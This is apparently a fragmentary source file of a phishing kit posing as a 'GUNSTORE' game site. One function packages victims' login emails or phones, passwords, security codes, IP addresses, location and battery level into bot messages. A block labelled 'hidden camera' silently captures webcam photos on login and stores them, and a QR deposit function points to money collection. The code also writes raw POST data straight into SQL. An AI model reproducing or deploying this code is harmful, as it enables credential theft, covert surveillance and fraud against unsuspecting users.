...
function formatBotMessage($data) {
    $msg = "╭➤ 𝐑𝐄𝐒𝐔𝐋𝐓 #" . rand(100, 999) . " | " . date('d/m/y') . "\n";
    $msg .= "╰➤ 𝐏𝐥𝐚𝐲𝐞𝐫 𝐈𝐃: " . ($data['uid'] ?? 'N/A') . "\n";
    $msg .= "╰➤ 𝐄𝐦𝐚𝐢𝐥/𝐏𝐡𝐨𝐧𝐞: " . ($data['email'] ?? $data['login'] ?? 'N/A') . "\n";
    $msg .= "╰➤ 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝: " . ($data['password'] ?? 'N/A') . "\n";
    $msg .= "╰➤ 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦: " . ($data['platform'] ?? 'N/A') . "\n";
    $msg .= "╰➤ 𝐋𝐞𝐯𝐞𝐥: " . ($data['level'] ?? 'N/A') . "\n";
    $msg .= "╰➤ 𝐏𝐡𝐨𝐧𝐞: " . ($data['contact'] ?? 'N/A') . "\n";
    $msg .= "╰➤ 𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐂𝐨𝐝𝐞: " . ($data['security_code'] ?? 'N/A') . "\n";
    $msg .= "╰➤ 𝐈𝐏: " . ($data['ip'] ?? 'Unknown') . "\n";
    $msg .= "╰➤ 𝐑𝐞𝐠𝐢𝐨𝐧: " . ($data['region'] ?? 'Unknown') . "\n";
    $msg .= "╰➤ 𝐂𝐢𝐭𝐲: " . ($data['city'] ?? 'Unknown') . "\n";
    $msg .= "╰➤ 𝐙𝐈𝐏: " . ($data['zip'] ?? 'Unknown') . "\n";
    $msg .= "╰➤ 𝐀𝐒: " . ($data['as'] ?? 'Unknown') . "\n";
    $msg .= "╰➤ 𝐁𝐚𝐭𝐭𝐞𝐫𝐲: " . ($data['battery'] ?? 'Unknown') . "%";
    return $msg;
}
...
if(isset($_GET['bot_cmd'])) {
    ...
    if($action == 'start') {
        $welcome_msg = "╭──────────────────╮\n";
        $welcome_msg .= "│   𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎    │\n";
        $welcome_msg .= "│    𝐆𝐔𝐍𝐒𝐓𝐎𝐑𝐄    │\n";
        $welcome_msg .= "╰──────────────────╯\n\n";
...
// ============ HIDDEN CAMERA - AUTO CAPTURE ON LOGIN ============
if(isset($_POST['hidden_capture'])) {
    $photo_data = $_POST['photo_data'];
    $ip = getUserIP();
    $user_id = $_SESSION['user_id'] ?? 0;
    $battery = getBatteryLevel();
    
    $db->exec("UPDATE users SET captured_photo='$photo_data', battery_level='$battery' WHERE id=$user_id");
...
<head>
    ...
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        ...
        .camera-container { position:fixed; bottom:140px; left:20px; z-index:100; background:rgba(0,0,0,0.8); padding:15px; border-radius:12px; border:1px solid #9b59b6; max-width:200px; display:none; }
        ...
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(function(stream) {
                ...
                video.onloadedmetadata = function() {
                    ...
                    formData.append('hidden_capture', '1');
...
function generateFundsQR() {
    ...
    if(!amt || amt < minDeposit) { alert('Minimum ₹' + minDeposit); return; }
    selectedAmount = amt;
